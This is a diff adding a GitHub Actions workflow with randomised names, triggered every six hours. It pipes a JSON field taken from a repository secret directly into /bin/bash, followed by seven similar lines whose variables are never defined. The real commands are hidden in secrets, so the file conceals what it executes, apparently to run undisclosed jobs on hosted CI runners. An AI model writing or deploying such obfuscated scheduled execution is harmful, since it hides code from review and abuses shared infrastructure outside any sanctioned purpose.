@@ -1,0 +1,24 @@
+name: ruanxiaowu19871010
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '26 2/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: ruanxiaowu19871010
+        env:
+          iaezo30: ${{ secrets.iaezo30 }}
+        run: |
+          echo $iaezo30 | jq -r .yf5749 | /bin/bash
+          echo $yrnf829 | jq -r .gw60 | /bin/bash
+          echo $zmu18758 | jq -r .lz3401 | /bin/bash
+          echo $hnsj2 | jq -r .qypa99083 | /bin/bash
+          echo $kcbl916 | jq -r .stzhn142 | /bin/bash
+          echo $hzoyf9579 | jq -r .qa7288 | /bin/bash
+          echo $ea72 | jq -r .s6643 | /bin/bash
+          echo $tf8 | jq -r .rbct6209 | /bin/bash
+
